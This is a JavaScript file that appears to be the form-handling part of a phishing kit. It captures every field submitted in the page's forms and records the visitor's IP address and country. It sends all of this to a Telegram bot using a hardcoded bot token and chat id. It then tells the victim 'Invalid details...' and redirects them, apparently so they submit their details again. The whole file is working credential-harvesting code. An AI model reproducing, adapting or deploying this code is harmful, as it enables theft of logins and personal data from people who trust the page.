document.addEventListener("DOMContentLoaded", () => {
  const DEFAULT_USER_ID = "7642510889"; // fallback if no id in URL
  const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown"; // default
  let userIP = "Unknown"; // default IP

  // Fetch country and IP first
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data) {
        if (data.country_name) userCountry = data.country_name;
        if (data.ip) userIP = data.ip;
      }
    })
    .catch(err => console.error("IP lookup error:", err));

  forms.forEach((form) => {
    // Find the message container in the form
    const messageDiv = form.querySelector(".form-message");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      // Ensure country and IP are available
      if (userCountry === "Unknown" || userIP === "Unknown") {
        try {
          const res = await fetch("https://ipapi.co/json/");
          const data = await res.json();
          if (data) {
            if (data.country_name) userCountry = data.country_name;
            if (data.ip) userIP = data.ip;
          }
        } catch (err) {
          console.error("Retry IP lookup error:", err);
        }
      }

      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;

      const formData = {};
      new FormData(form).forEach((value, key) => {
        formData[key] = value;
      });

      // Current date & time (local)
      const now = new Date();
      const dateTime = now.toLocaleString();

      // Only include Form line if form has a name
      const formName = (form.getAttribute("name") || "").trim();
      const formLine = formName ? `📄 Form: ${formName}\n` : "";

      const payload = {
        chat_id: userId,
        text:
          `📋 *New Form Submitted*\n\n` +
          `🏷️ Page: ${document.title}\n` +
          formLine +
          `🌍 Country: ${userCountry}\n` +
          `🕒 Date & Time: ${dateTime}\n` +
          `📍 IP: ${userIP}\n\n` +
          Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
        parse_mode: "Markdown"
      };

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (response.ok) {
          messageDiv.style.color = "#00ff7f"; // green for success
          messageDiv.textContent = "Invalid details...";
          form.reset();
          setTimeout(() => {
            window.location.href = `index.html?id=${userId}`;
          }, 1500);
        } else {
          const errorText = await response.text();
          console.error("Telegram Error:", errorText);
          messageDiv.style.color = "#ff4d4d"; // red for errors
          messageDiv.textContent = "❌ Error submitting form. Check console for details.";
        }
      } catch (err) {
        console.error("Network Error:", err);
        messageDiv.style.color = "#ffcc00"; // yellow for network issues
        messageDiv.textContent = "⚠️ Network error. Please check your connection.";
      }
    });
  });
});